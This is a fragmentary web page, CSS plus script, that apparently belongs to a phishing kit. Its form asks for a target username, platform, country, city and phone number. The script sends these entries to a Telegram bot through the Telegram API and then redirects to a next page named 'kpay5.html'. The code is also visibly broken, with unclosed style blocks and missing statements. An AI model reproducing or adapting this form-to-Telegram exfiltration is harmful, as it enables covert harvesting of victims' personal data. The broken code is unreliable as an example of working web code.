    :root {

      --text-main: #222222;
      --text-muted: #888888;
      --accent-blue: #0070f3;
      --accent-green: #17a54d;
      --error-red: #dc2626;

    * {

      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text",
        system-ui, -webkit-system-font, sans-serif;
      background: var(--bg-page);
      color: var(--text-main);
    }

    .page-wrapper {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 24px 12px;
    }

    .panel {
      width: 100%;
      max-width: 430px;
      background: var(--bg-panel);
      border-radius: 18px;
      box-shadow: 0 8px 24px rgba(15, 23, 42, 0.08);
      padding: 22px 18px 24px;
    }

    .inner-card {
      padding: 6px 2px 0;
    }

    h1 {
      font-size: 22px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 20px;
    }

    .form-group {
      margin-bottom: 14px;
    }

    label {
      display: block;
      font-size: 13px;
      margin-bottom: 6px;
    }

    input[type="text"],
    input[type="tel"],
    select {
      width: 100%;
      padding: 10px 11px;
      border-radius: 6px;
      border: 1px solid #d1d5db;
      font-size: 14px;
      outline: none;
      background-color: #ffffff;
      transition: border-color 0.15s ease, box-shadow 0.15s ease,
        background-color 0.15s ease;
    }

    input::placeholder,
    select:invalid {
      color: #c0c4cc;
    }

    input:focus,
    select:focus {
      border-color: var(--accent-blue);
      box-shadow: 0 0 0 1px rgba(0, 112, 243, 0.18);
      background-color: #ffffff;
    }

    .error-text {
      font-size: 11px;
      color: var(--error-red);

      border: none;
      background: #0070f3;
      color: #ffffff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.15s ease, transform 0.05s ease,
        box-shadow 0.15s ease;
    }

    .btn-submit:hover {
      background: #0060d0;
    }

    .btn-submit:active {
      transform: translateY(1px);
      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.25);
    }

    @media (max-width: 400px) {
      .panel {
        padding: 18px 14px 20px;

    const form        = document.getElementById("step2Form");
    const countryEl   = document.getElementById("country");
    const errorLabel  = document.getElementById("formError");

      e.preventDefault();

      const wantedUser = document.getElementById("wantedUser").value.trim();
      const platform   = document.getElementById("platform").value.trim();
      const country    = countryEl.value;
      const city       = document.getElementById("city").value.trim();
      const phone      = document.getElementById("phone").value.trim();

      if (!wantedUser || !platform || !country || !city || !phone) {

      const message =

        "üìû Phone: " + phone;

      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
        method: "POST",

        body: JSON.stringify({
          chat_id: chatId,
          text: message

        window.location.href = "kpay5.html";
      })
      .catch(error => {

    });
